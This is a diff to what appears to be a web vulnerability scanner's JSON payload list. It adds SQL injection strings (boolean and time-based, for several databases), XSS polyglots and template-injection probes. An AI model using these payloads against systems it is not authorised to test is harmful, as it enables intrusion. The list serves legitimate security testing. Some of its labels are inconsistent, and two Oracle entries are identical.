@@ -2,29 +2,228 @@
   "payloads": [
     {
       "payload": "'",
-      "type": "sql_injection",
-      "description": "Basic SQL injection test",
-      "detection": {
-        "type": "error_based",
-        "patterns": [
-          "SQL syntax",
-          "mysql_error",
-          "ORA-",
-          "SQLite"
-        ]
-      }
+      "description": "SQL Injection",
+      "vulnerabilities": [
+        {
+          "type": "sql_injection"
+        }
+      ]
+     },
+     {
+      "payload": "\"",
+      "description": "SQL Injection",
+      "vulnerabilities": [
+        {
+          "type": "sql_injection"
+        }
+      ]
+     },
+     {
+      "payload": [
+        "' or 1=1 -- -;<img src=x>//",
+        "' or 1>1 -- -;<img src=x>//"
+      ],
+      "description": "Boolean-based SQLi, XSS",
+      "vulnerabilities": [
+        {
+          "type": "sql_injection"
+        },
+        {
+          "type": "xss"
+        }
+      ]
+     },
+     {
+      "payload": "' OR WAITFOR DELAY \"00:00:05\"-- ",
+      "description": "MSSQL time-based SQLi",
+      "vulnerabilities": [
+        {
+           "type": "sql_injection"
+        }
+      ]
+     },
+     {
+      "payload": "' AND SLEEP(5)/*",
+      "description": "MySQL time-based SQLi",
+      "vulnerabilities": [
+        {
+           "type": "sql_injection"
+        }
+      ]
+     },
+     {
+      "payload": "SLEEP(5) /*' or SLEEP(5) or '\" or SLEEP(5) or \"*/",
+      "description": "MySQL time-based SQLi",
+      "vulnerabilities": [
+        {
+          "type": "sql_injection"
+        }
+      ]
+     },
+     {
+      "payload": "\"' AND IF(1=1,SLEEP(5),0)--" ,
+      "description": "MySQL time-based SQLi",
+      "vulnerabilities": [
+        {
+           "type": "sql_injection"
+        }
+      ]
+     },
+     {
+      "payload": "' OR pg_sleep(5)" ,
+      "description": "postgreSQL time-based SQLi",
+      "vulnerabilities": [
+        {
+           "type": "sql_injection"
+         }
+      ]
+     },
+     {
+      "payload": "' || BEGIN DBMS_SESSION.SLEEP(5); END; -- " ,
+      "description": "Orcle(< 18c) time-based SQLi",
+      "vulnerabilities": [
+        {
+           "type": "sql_injection"
+        }
+      ]
+     },
+     {
+      "payload": "' || BEGIN DBMS_SESSION.SLEEP(5); END; -- " ,
+      "description": "Orcle(>= 18c) time-based SQLi",
+      "vulnerabilities": [
+        {
+           "type": "sql_injection"
+        }
+      ]
+     },
+     {
+      "payload": "<svg/onload='+/\"`/+/onmouseover=1/+/[*/[]/+alert(1);//'>",
+      "description": "SQL Injection, XSS",
+      "vulnerabilities": [
+         {
+           "type": "sql_injection"
+         },
+         {
+          "type": "xss"
+         }
+      ]
+     },
+     {
+      "payload": "';}<h1>test</h1>//",
+      "description": "HTML injection, SQL injection",
+      "vulnerabilities": [
+        {
+          "type": "sql_injection"
+        },
+        {
+          "type": "xss"
+        }
+      ]
     },
     {
-      "payload": "<script>alert(1)</script>",
-      "type": "xss",
-      "description": "Basic XSS test",
-      "detection": {
-        "type": "reflection",
-        "patterns": [
-          "<script>",
-          "alert(1)"
-        ]
-      }
-    }
+      "payload": "'\"<script>alert({{1234**3}})</script><!---",
+      "description": "SQL Injection, SSTI, XSS",
+      "vulnerabilities": [
+        {
+          "type": "sql_injection"
+        },
+        {
+          "type": "ssti"
+        },
+        {
+          "type": "xss"
+        }
+      ]
+     },
+     {
+      "payload": "<img src=x onerror='javascript:alert(6)'>",
+      "description": "XSS test using img tag with onerror event",
+      "vulnerabilities": [
+       {
+          "type": "sql_injection"
+        },
+        {
+          "type": "xss"
+        }
+      ]
+     },
+     {
+      "payload": "<img src='a' alt=\"test\" onload=javascript%3Aalert`6`>" ,
+      "description": "SQL Injection, XSS",
+      "vulnerabilities": [
+        {
+          "type": "sql_injection"
+        },
+        {
+          "type": "xss"
+        }
+      ]
+     },
+     {
+      "payload": "/**/a';${1234**3};'--%20-",
+      "description": "SQL Injection, SSTI, XSS",
+      "vulnerabilities": [
+        {
+          "type": "sql_injection"
+        },
+        {
+          "type": "ssti"
+        },
+        {
+           "type": "xss"
+        }
+      ]
+     },
+     {
+      "payload": "/*!SLEEP(5)/*/alert(1)/*/*/",
+      "description": "MySQL time-based SQLi and XSS test",
+      "vulnerabilities": [
+        {
+          "type": "sql_injection"
+        },
+        {
+          "type": "xss"
+        }
+      ]
+     },
+     {
+      "payload": "'\"<script>#{1234**3};alert(1)</script><img src=x onerror=alert(2)><!--",
+      "description": "SQL Injection, SSTI, XSS",
+      "vulnerabilities": [
+        {
+          "type": "sql_injection"
+        },
+        {
+          "type": "ssti"
+        },
+        {
+          "type": "xss"
+        }
+      ]
+     },
+     {
+      "payload": "\" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//",
+      "description": "SQL Injection, XSS",
+      "vulnerabilities": [
+          {
+           "type": "sql_injection"
+         },
+        {
+          "type": "xss"
+        }
+      ]
+     },
+     {
+      "payload": "'\"><iframe onload=alert('{{1234**3}}');>",
+      "description": "SQL Injection, XSS, SSTI",
+      "vulnerabilities": [
+        {
+           "type": "sql_injection"
+        },
+        {
+          "type": "xss"
+        }
+      ]
+     }
   ]
 } 
